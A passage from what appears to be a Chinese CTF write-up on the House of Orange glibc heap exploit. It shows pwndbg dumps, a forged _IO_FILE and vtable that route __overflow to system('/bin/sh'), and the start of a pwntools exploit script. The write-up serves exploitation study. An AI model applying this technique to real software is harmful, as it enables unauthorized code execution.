-136504360, </span><br><span class="line">    _flags2 = 32767, </span><br><span class="line">    _old_offset = 140737351850968, </span><br><span class="line">    _cur_column = 7144, </span><br><span class="line">    _vtable_offset = -35 <span class="string">&#x27;\335&#x27;</span>, </span><br><span class="line">    _shortbuf = &lt;incomplete sequence \367&gt;, </span><br><span class="line">    _lock = 0x7ffff7dd1be8 &lt;main_arena+200&gt;, </span><br><span class="line">    _offset = 140737351851000, </span><br><span class="line">    _codecvt = 0x7ffff7dd1bf8 &lt;main_arena+216&gt;, </span><br><span class="line">    _wide_data = 0x7ffff7dd1c08 &lt;main_arena+232&gt;, </span><br><span class="line">    _freeres_list = 0x7ffff7dd1c08 &lt;main_arena+232&gt;, </span><br><span class="line">    _freeres_buf = 0x7ffff7dd1c18 &lt;main_arena+248&gt;, </span><br><span class="line">    __pad5 = 140737351851032, </span><br><span class="line">    _mode = -136504280, </span><br><span class="line">    _unused2 = <span class="string">&quot;\377\177\000\000(\034\335\367\377\177\000\000\070\034\335\367\377\177\000&quot;</span></span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7ffff7dd1c38 &lt;main_arena+280&gt;</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; bin</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all [corrupted]</span><br><span class="line">FD: 0x5555557584f0 —▸ 0x7ffff7dd1bb8 (main_arena+152) ◂— 0x5555557584f0</span><br><span class="line">BK: 0x7ffff7dd2510 ◂— 0x0</span><br><span class="line">smallbins</span><br><span class="line">0x50: 0x5555557584f0 —▸ 0x7ffff7dd1bb8 (main_arena+152) ◂— 0x5555557584f0 <span class="comment">#释放后由small bin来管理</span></span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>那么还差0x10,就改old top chunk size 为0x60,即可在main_arena 向下偏移0x10进行储存,这就实现了在main_arena + 0x58伪造IO_FILE中实现连接我们伪造的IO_FILE,实现效果如下</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *((struct _IO_FILE_plus*)0x00007ffff7dd1b78)</span><br><span class="line"><span class="variable">$2</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 1433903120, </span><br><span class="line">    _IO_read_ptr = 0x5555557584f0 <span class="string">&quot;/bin/sh&quot;</span>, </span><br><span class="line">    _IO_read_end = 0x5555557584f0 <span class="string">&quot;/bin/sh&quot;</span>, </span><br><span class="line">    _IO_read_base = 0x7ffff7dd2510 <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_write_base = 0x7ffff7dd1b88 &lt;main_arena+104&gt; <span class="string">&quot;\360\204uUUU&quot;</span>, </span><br><span class="line">    _IO_write_ptr = 0x7ffff7dd1b88 &lt;main_arena+104&gt; <span class="string">&quot;\360\204uUUU&quot;</span>, </span><br><span class="line">    _IO_write_end = 0x7ffff7dd1b98 &lt;main_arena+120&gt; <span class="string">&quot;\210\033\335\367\377\177&quot;</span>, </span><br><span class="line">    _IO_buf_base = 0x7ffff7dd1b98 &lt;main_arena+120&gt; <span class="string">&quot;\210\033\335\367\377\177&quot;</span>, </span><br><span class="line">    _IO_buf_end = 0x7ffff7dd1ba8 &lt;main_arena+136&gt; <span class="string">&quot;\230\033\335\367\377\177&quot;</span>, </span><br><span class="line">    _IO_save_base = 0x7ffff7dd1ba8 &lt;main_arena+136&gt; <span class="string">&quot;\230\033\335\367\377\177&quot;</span>, </span><br><span class="line">    _IO_backup_base = 0x7ffff7dd1bb8 &lt;main_arena+152&gt; <span class="string">&quot;\250\033\335\367\377\177&quot;</span>, </span><br><span class="line">    _IO_save_end = 0x7ffff7dd1bb8 &lt;main_arena+152&gt; <span class="string">&quot;\250\033\335\367\377\177&quot;</span>, </span><br><span class="line">    _markers = 0x5555557584f0, </span><br><span class="line">    _chain = 0x5555557584f0,  //这里指向 old top chunk,也就是我们伪造的堆块</span><br><span class="line">    _fileno = -136504360, </span><br><span class="line">    _flags2 = 32767, </span><br><span class="line">    _old_offset = 140737351850968, </span><br><span class="line">    _cur_column = 7144, </span><br><span class="line">    _vtable_offset = -35 <span class="string">&#x27;\335&#x27;</span>, </span><br><span class="line">    _shortbuf = &lt;incomplete sequence \367&gt;, </span><br><span class="line">    _lock = 0x7ffff7dd1be8 &lt;main_arena+200&gt;, </span><br><span class="line">    _offset = 140737351851000, </span><br><span class="line">    _codecvt = 0x7ffff7dd1bf8 &lt;main_arena+216&gt;, </span><br><span class="line">    _wide_data = 0x7ffff7dd1c08 &lt;main_arena+232&gt;, </span><br><span class="line">    _freeres_list = 0x7ffff7dd1c08 &lt;main_arena+232&gt;, </span><br><span class="line">    _freeres_buf = 0x7ffff7dd1c18 &lt;main_arena+248&gt;, </span><br><span class="line">    __pad5 = 140737351851032, </span><br><span class="line">    _mode = -136504280, </span><br><span class="line">    _unused2 = <span class="string">&quot;\377\177\000\000(\034\335\367\377\177\000\000\070\034\335\367\377\177\000&quot;</span></span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7ffff7dd1c38 &lt;main_arena+280&gt;</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; x /40gx 0x5555557584f0</span><br><span class="line">0x5555557584f0:	0x0068732f6e69622f	0x0000000000000061 <span class="comment"># 我们的old top chunk</span></span><br><span class="line">0x555555758500:	0x00007ffff7dd1bc8	0x00007ffff7dd1bc8</span><br><span class="line">0x555555758510:	0x0000000000000000	0x0000000000000001</span><br><span class="line">0x555555758520:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555758530:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555758540:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x555555758550:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>利用如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Control program</span></span><br><span class="line">p = <span class="string">&#x27;B&#x27;</span> * <span class="number">0x400</span></span><br><span class="line">p += p64(<span class="number">0</span>)</span><br><span class="line">p += p64(<span class="number">0x21</span>)</span><br><span class="line">p += <span class="string">&#x27;B&#x27;</span> * <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fake IO_FILE</span></span><br><span class="line">f = <span class="string">&#x27;/bin/sh\x00&#x27;</span> <span class="comment"># overflow arg -&gt; system(&#x27;/bin/sh&#x27;) 这是后续调用system会传入IO_FILE的地址</span></span><br><span class="line">f += p64(<span class="number">0x61</span>)    <span class="comment"># small bin size,使main_arena + 0x58 fake IO_FILE的_chian指向当前伪造的IO_FILE</span></span><br><span class="line">   </span><br><span class="line">f += p64(<span class="number">0</span>) + p64(_IO_list_all - <span class="number">0x10</span>) <span class="comment"># unsoted bin attack 修改 _IO_list_all为main_arena + 0x58</span></span><br></pre></td></tr></table></figure>



<h3 id="伪造IO-FILE"><a href="#伪造IO-FILE" class="headerlink" title="伪造IO_FILE"></a>伪造IO_FILE</h3><p>上面就实现了修改main_arena + 0x58 中 fake IO_FILE的<code>_chain</code>指向我们的old top chunk,那么就在old top chunk伪造IO_FILE,在伪造的时候必须要得通过检查</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) </span><br><span class="line">           || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">               &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">           )</span><br><span class="line">          &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">        result = EOF;</span><br></pre></td></tr></table></figure>

<p>则fp-&gt;<code>_mode</code> &lt;= 0 且fp-&gt;<code>_IO_write_ptr</code> &gt; fp-&gt;<code>_IO_write_base</code> 且<code>_IO_vtable_offset</code> (fp) == 0,这样才能执行<code>_IO_OVERFLOW (fp, EOF) == EOF)</code></p>
<p>那么利用就可以这样写</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fake file</span></span><br><span class="line">	f = <span class="string">&#x27;/bin/sh\x00&#x27;</span> <span class="comment"># flag overflow arg -&gt; system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">	f += p64(<span class="number">0x61</span>)    <span class="comment"># _IO_read_ptr small bin size</span></span><br><span class="line">	<span class="comment">#  unsoted bin attack</span></span><br><span class="line">	f += p64(<span class="number">0</span>) <span class="comment"># _IO_read_end)</span></span><br><span class="line">	f += p64(_IO_list_all - <span class="number">0x10</span>)  <span class="comment"># _IO_read_base</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">#bypass check</span></span><br><span class="line">	<span class="comment"># 使fp-&gt;_IO_write_base &lt; fp-&gt;_IO_write_ptr绕过检查</span></span><br><span class="line">	f += p64(<span class="number">0</span>) <span class="comment"># _IO_write_base </span></span><br><span class="line">	f += p64(<span class="number">1</span>) <span class="comment"># _IO_write_ptr</span></span><br><span class="line"></span><br><span class="line">	f += p64(<span class="number">0</span>) <span class="comment"># _IO_write_end</span></span><br><span class="line">	f += p64(<span class="number">0</span>) <span class="comment"># _IO_buf_base</span></span><br><span class="line">	f += p64(<span class="number">0</span>) <span class="comment"># _IO_buf_end</span></span><br><span class="line">	f += p64(<span class="number">0</span>) <span class="comment"># _IO_save_base</span></span><br><span class="line">	f += p64(<span class="number">0</span>) <span class="comment"># _IO_backup_base</span></span><br><span class="line">	f += p64(<span class="number">0</span>) <span class="comment"># _IO_save_end</span></span><br><span class="line">	f += p64(<span class="number">0</span>) <span class="comment"># *_markers</span></span><br><span class="line">	f += p64(<span class="number">0</span>) <span class="comment"># *_chain</span></span><br><span class="line"></span><br><span class="line">	f += p32(<span class="number">0</span>) <span class="comment"># _fileno</span></span><br><span class="line">	f += p32(<span class="number">0</span>) <span class="comment"># _flags2</span></span><br><span class="line"></span><br><span class="line">	f += p64(<span class="number">1</span>)  <span class="comment"># _old_offset</span></span><br><span class="line"></span><br><span class="line">	f += p16(<span class="number">2</span>) <span class="comment"># ushort _cur_colum;</span></span><br><span class="line">	f += p8(<span class="number">3</span>)  <span class="comment"># char _vtable_offset</span></span><br><span class="line">	f += p8(<span class="number">4</span>)  <span class="comment"># char _shrotbuf[1]</span></span><br><span class="line">	f += p32(<span class="number">0</span>) <span class="comment"># null for alignment</span></span><br><span class="line"></span><br><span class="line">	f += p64(<span class="number">0</span>) <span class="comment"># _offset</span></span><br><span class="line">	f += p64(<span class="number">6</span>) <span class="comment"># _codecvt</span></span><br><span class="line">	f += p64(<span class="number">0</span>) <span class="comment"># _wide_data</span></span><br><span class="line">	f += p64(<span class="number">0</span>) <span class="comment"># _freeres_list</span></span><br><span class="line">	f += p64(<span class="number">0</span>) <span class="comment"># _freeres_buf</span></span><br><span class="line"></span><br><span class="line">	f += p64(<span class="number">0</span>) <span class="comment"># __pad5</span></span><br><span class="line">	f += p32(<span class="number">0</span>) <span class="comment"># _mode 为了绕过检查,fp-&gt;mode &lt;=0 ((addr + 0xc8) &lt;= 0)</span></span><br><span class="line">	f += p32(<span class="number">0</span>) <span class="comment"># _unused2</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>修改结果如下</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *((struct _IO_FILE_plus*)0x5555557584f0)</span><br><span class="line"><span class="variable">$1</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 1852400175, </span><br><span class="line">    _IO_read_ptr = 0x61 &lt;error: Cannot access memory at address 0x61&gt;, </span><br><span class="line">    _IO_read_end = 0x0, </span><br><span class="line">    _IO_read_base = 0x7ffff7dd2510 <span class="string">&quot;&quot;</span>, </span><br><span class="line">    _IO_write_base = 0x0, </span><br><span class="line">    _IO_write_ptr = 0x1 &lt;error: Cannot access memory at address 0x1&gt;, </span><br><span class="line">    _IO_write_end = 0x0, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x0, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = 1, </span><br><span class="line">    _cur_column = 2, </span><br><span class="line">    _vtable_offset = 3 <span class="string">&#x27;\003&#x27;</span>, </span><br><span class="line">    _shortbuf = <span class="string">&quot;\004&quot;</span>, </span><br><span class="line">    _lock = 0x0, </span><br><span class="line">    _offset = 6, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x0, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = 0, </span><br><span class="line">    _unused2 = <span class="string">&#x27;\000&#x27;</span> &lt;repeats 19 <span class="built_in">times</span>&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x5555557585c8</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="伪造-vtable"><a href="#伪造-vtable" class="headerlink" title="伪造 vtable"></a>伪造 vtable</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p += f</span><br><span class="line">p += p64(<span class="number">0</span>) * <span class="number">3</span> <span class="comment"># alignment to vtable</span></span><br><span class="line">p += p64(heap + <span class="number">0x5c8</span>) <span class="comment"># vtable指向自己</span></span><br><span class="line">p += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">p += p64(lib.sym[<span class="string">&#x27;system&#x27;</span>]) <span class="comment"># _IO_overflow 位置改为system</span></span><br><span class="line">   md(<span class="number">0x600</span>, p) <span class="comment"># 修改一系列所伪造好的布局</span></span><br><span class="line">   </span><br></pre></td></tr></table></figure>

<p>修改结果如下</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *((struct _IO_FILE_plus*)0x5555557584f0).vtable</span><br><span class="line"><span class="variable">$2</span> = &#123;</span><br><span class="line">  __dummy = 93824994346440, </span><br><span class="line">  __dummy2 = 0, </span><br><span class="line">  __finish = 0x0, </span><br><span class="line">  __overflow = 0x7ffff7a52390 &lt;__libc_system&gt;, <span class="comment">#成功修改为system</span></span><br><span class="line">  __underflow = 0x0, </span><br><span class="line">  __uflow = 0x0, </span><br><span class="line">  __pbackfail = 0x0, </span><br><span class="line">  __xsputn = 0x0, </span><br><span class="line">  __xsgetn = 0x0, </span><br><span class="line">  __seekoff = 0x0, </span><br><span class="line">  __seekpos = 0x0, </span><br><span class="line">  __setbuf = 0x0, </span><br><span class="line">  __sync = 0x0, </span><br><span class="line">  __doallocate = 0x0, </span><br><span class="line">  __read = 0x0, </span><br><span class="line">  __write = 0x0, </span><br><span class="line">  __seek = 0x0, </span><br><span class="line">  __close = 0x0, </span><br><span class="line">  __stat = 0x0, </span><br><span class="line">  __showmanyc = 0x0, </span><br><span class="line">  __imbue = 0x0</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>再次申请 0x10的时候, 由于unsorted bin 的结构已经被修改, 0x10 &lt;= 2*SIZE_SZ，就会触发malloc_printerr,然后就开始执行各种已经布局好的各种trick,最终执行到system get shell</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,<span class="comment">// 执行该函数</span></span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sl(<span class="string">&#x27;1&#x27;</span>) <span class="comment">#get shell</span></span><br></pre></td></tr></table></figure>




<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: I0gan</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">exeFile = <span class="string">&#x27;houseoforange&#x27;</span></span><br><span class="line">libFile = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line"><span class="comment">#libFile = &#x27;./libc64-2.19.so&#x27;</span></span><br><span class="line"></span><br><span class="line">remoteIp = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">remotePort = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">LIB   = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">r   =  <span class="keyword">lambda</span> x : io.recv(x)</span><br><span class="line">ra  =  <span class="keyword">lambda</span>   : io.recvall()</span><br><span class="line">rl  =  <span class="keyword">lambda</span>   : io.recvline(keepends = <span class="literal">True</span>)</span><br><span class="line">ru  =  <span class="keyword">lambda</span> x : io.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">s   =  <span class="keyword">lambda</span> x : io.send(x)</span><br><span class="line">sl  =  <span class="keyword">lambda</span> x : io.sendline(x)</span><br><span class="line">sa  =  <span class="keyword">lambda</span> x, y : io.sendafter(x, y)</span><br><span class="line">sla =  <span class="keyword">lambda</span> x, y : io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line">db    = <span class="keyword">lambda</span>   : gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>(<span class="params">size, data</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;Your choice : &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	sla(<span class="string">&#x27;name :&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">	sa(<span class="string">&#x27;Name :&#x27;</span>, data)</span><br><span class="line">	sla(<span class="string">&#x27;Price of Orange:&#x27;</span>, <span class="built_in">str</span>(<span class="number">16</span>))</span><br><span class="line">	sla(<span class="string">&#x27;Orange:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md</span>(<span class="params">size, data</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;Your choice : &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	sla(<span class="string">&#x27;name :&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">	sa(<span class="string">&#x27;Name:&#x27;</span>, data)</span><br><span class="line">	sla(<span class="string">&#x27;Price of Orange:&#x27;</span>, <span class="built_in">str</span>(<span class="number">16</span>))</span><br><span class="line">	sla(<span class="string">&#x27;Orange:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dp</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;Your choice : &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>))	</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------Exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	